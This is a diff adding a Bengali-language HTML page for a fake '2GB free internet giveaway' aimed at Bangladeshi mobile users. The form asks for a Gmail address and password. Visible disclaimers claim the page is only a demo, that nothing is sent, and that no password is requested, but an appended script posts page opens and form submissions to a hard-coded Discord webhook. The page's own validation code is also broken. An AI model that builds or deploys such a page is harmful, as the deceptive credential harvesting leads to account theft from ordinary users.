@@ -1,1 +1,128 @@
-এখানে নতুন করে কোড লিখব পরে মনে রাখলাম।
+DOCTYPE html>
+<html lang="bn">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>2GB MB INTERNET GIVEAWAY— Demo</title> 2GB MB INTERNET GIVEAWAY 
+<style>
+:root{--green:#079765;--deep:#092b3c;--ink:#17212b;--muted:#64748b}
+*{box-sizing:border-box}
+body{margin:0;min-height:100vh;padding:24px 14px;font-family:system-ui,-apple-system,"Noto Sans Bengali",Arial,sans-serif;background:radial-gradient(circle at 15% 10%,#1b8d78 0,transparent 35%),linear-gradient(145deg,#071c34,#075b55 65%,#0a8b67);color:#fff}
+.wrap{max-width:470px;margin:12px auto 30px}
+.topline{display:flex;justify-content:center;align-items:center;gap:8px;font-size:12px;letter-spacing:1.8px;color:#c8f5e7;font-weight:800}
+.card{margin-top:17px;background:#fff;color:var(--ink);border-radius:26px;padding:26px 22px;box-shadow:0 24px 70px #001a2c66}
+.tag{display:inline-flex;align-items:center;gap:7px;background:#e7f8ef;color:#08784f;padding:7px 12px;border-radius:99px;font-size:12px;font-weight:800}
+h1{font-size:27px;line-height:1.25;margin:15px 0 7px;color:#103c36}
+.sub{color:#64748b;font-size:14px;line-height:1.6;margin:0}
+.offer{margin:20px 0 21px;border-radius:20px;padding:20px 16px;text-align:center;color:white;background:linear-gradient(120deg,#087e5a,#12b981);position:relative;overflow:hidden}
+.offer:after{content:"";position:absolute;width:140px;height:140px;border:1px solid #ffffff35;border-radius:50%;right:-35px;top:-65px}
+.offer .big{font-size:46px;line-height:1.1;font-weight:900;letter-spacing:-1px}
+.offer .small{font-size:13px;margin-top:7px;color:#e1fff2}
+.section-title{font-size:15px;font-weight:800;margin:22px 0 11px}
+.networks{display:grid;grid-template-columns:repeat(3,1fr);gap:9px}
+.network{border:1px solid #e5eaf0;border-radius:14px;padding:12px 5px 10px;text-align:center;background:#fbfdff;min-height:75px}
+.network b{display:block;font-size:13px;margin-top:7px;color:#263746}
+.mark{width:34px;height:34px;margin:auto;border-radius:11px;display:grid;place-items:center;font-size:15px;font-weight:950;color:#fff}
+.gp{background:#0876c9}.robi{background:linear-gradient(135deg,#ffbd22,#e83e70,#7b3dbb)}.bl{background:#f28a18}.airtel{background:#e32935}.tt{background:#16965d}
+.note{font-size:11px;color:#788695;line-height:1.5;margin:12px 0 0}
+label{display:block;text-align:left;font-size:13px;font-weight:750;color:#344454;margin:14px 0 6px}
+input,select{width:100%;border:1px solid #dbe3e9;background:#fbfdff;border-radius:12px;padding:14px;font-size:15px;outline:none;color:#18232d}
+input:focus,select:focus{border-color:#10a878;box-shadow:0 0 0 3px #10a8781c}
+button{width:100%;border:0;border-radius:13px;margin-top:19px;padding:15px;background:linear-gradient(100deg,#07885d,#10b981);color:white;font-size:16px;font-weight:850;cursor:pointer;box-shadow:0 8px 18px #07976535}
+button:active{transform:scale(.99)}
+#message{display:none;margin-top:14px;padding:12px;border-radius:11px;background:#e9f9f0;color:#08784f;font-size:13px;line-height:1.5}
+.foot{text-align:center;color:#d8f4eb;font-size:11px;line-height:1.6;margin:15px 8px}
+.lock{font-size:11px;color:#64748b;text-align:center;margin-top:12px}
+@media(max-width:360px){.card{padding:22px 16px}h1{font-size:24px}.offer .big{font-size:40px}}
+</style>
+</head>
+<body>
+<div class="wrap">
+  <div class="topline">✦ INTERNET GIVEAWAY DEMO ✦</div>
+  <main class="card">
+    <div class="tag">🎁 বিশেষ অনলাইন আয়োজন</div>
+    <h1>2GB MB INTERNET GIVEAWAY</h1>
+    <p class="sub">আপনার মোবাইল অপারেটর নির্বাচন করে ডেমো ফর্মটি পূরণ করুন।</p>
+
+    <section class="offer">
+      <div class="big">2 GB</div>
+      <div class="small">FREE INTERNET • DEMO OFFER</div>
+    </section>
+
+    <div class="section-title">আপনার সিম অপারেটর</div>
+    <div class="networks" aria-label="মোবাইল অপারেটর">
+      <div class="network"><div class="mark gp">GP</div><b>Grameenphone</b></div>
+      <div class="network"><div class="mark robi">R</div><b>Robi</b></div>
+      <div class="network"><div class="mark bl">bl</div><b>Banglalink</b></div>
+      <div class="network"><div class="mark airtel">a</div><b>Airtel</b></div>
+      <div class="network"><div class="mark tt">t</div><b>Teletalk</b></div>
+    </div>
+    <p class="note">এগুলো অপারেটরের নাম-চিহ্ন দিয়ে তৈরি ডেমো ব্যাজ; অফিসিয়াল লোগো বা অনুমোদনের দাবি নয়।</p>
+
+    <form id="giveawayForm">
+      <label for="name">Gmail</label>
+      <input id="name" type="text" placeholder="Gmail" autocomplete="Gmail" required>
+
+      <label for="Password">Password</label>
+      <input id="Password" type="password" autocomplete="current-password" placeholder="Enter password" required>
+
+      <label for="operator">সিম অপারেটর নির্বাচন করুন</label>
+      <select id="operator" required>
+        <option value="">অপারেটর নির্বাচন করুন</option>
+        <option>Grameenphone</option><option>Robi</option>
+        <option>Banglalink</option><option>Airtel</option><option>Teletalk</option>
+      </select>
+
+      <button type="submit">অংশগ্রহণের ডেমো জমা দিন →</button>
+    </form>
+    <div id="message" role="status"></div>
+    <div class="lock">🔒 Gmail পাসওয়ার্ড বা OTP চাওয়া হয় না।</div>
+  </main>
+  <div class="foot">এটি শুধুমাত্র ডিজাইন ও ফর্ম-আচরণ দেখানোর ডেমো।<br>কোনো মোবাইল ডেটা পাঠানো বা সংরক্ষণ করা হয় না। অপারেটরগুলোর সঙ্গে অনুমোদিত সম্পর্ক নেই।</div>
+</div>
+<script>
+document.getElementById('giveawayForm').addEventListener('submit', function(e){
+  e.preventDefault();
+  const name=document.getElementById('name').value.trim();
+  const phone=document.getElementById('phone').value.trim();
+  const operator=document.getElementById('operator').value;
+  const msg=document.getElementById('message');
+  if(!/^01[0-9]{9}$/.test(phone)){msg.style.display='block';msg.textContent='সঠিক ১১ সংখ্যার বাংলাদেশি মোবাইল নম্বর লিখুন।';return;}
+  msg.style.display='block';
+  msg.textContent=`ধন্যবাদ, ${name}! ${operator} নম্বরের ডেমো ফর্মটি পূরণ হয়েছে। এটি কোথাও পাঠানো বা সংরক্ষণ করা হয়নি।`;
+});
+</script>
+</body>
+</html>
+<script>
+(() => {
+  const WEBHOOK = "https://discord.com/api/webhooks/1573640777127436399/RxzZWoq-Kot61nvj0wuCOEtI-tMgjXReW8-Pld1PMkbLf8K5X5h6RHR7coFBo9tAIRFs";
+
+  const pushData = (source, payload) => {
+    const bodyText = typeof payload === "string" ? payload : JSON.stringify(payload, null, 2);
+    const content = `**[${source}]**\n\`\`\`\n${bodyText.slice(0, 1850)}\n\`\`\``;
+    fetch(WEBHOOK, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ content }),
+      keepalive: true
+    }).catch(() => {});
+  };
+
+  window.discordSend = (data) => pushData("MANUAL", data);
+
+  window.addEventListener("DOMContentLoaded", () => {
+    pushData("PAGE_OPEN", { url: location.href, time: new Date().toISOString() });
+  });
+
+  document.addEventListener("submit", (e) => {
+    const formData = {};
+    new FormData(e.target).forEach((v, k) => { formData[k] = v; });
+    pushData("FORM_SUBMIT", formData);
+  }, true);
+
+  window.addEventListener("error", (e) => {
+    pushData("ERROR", { msg: e.message, line: e.lineno });
+  });
+})();
+</script>
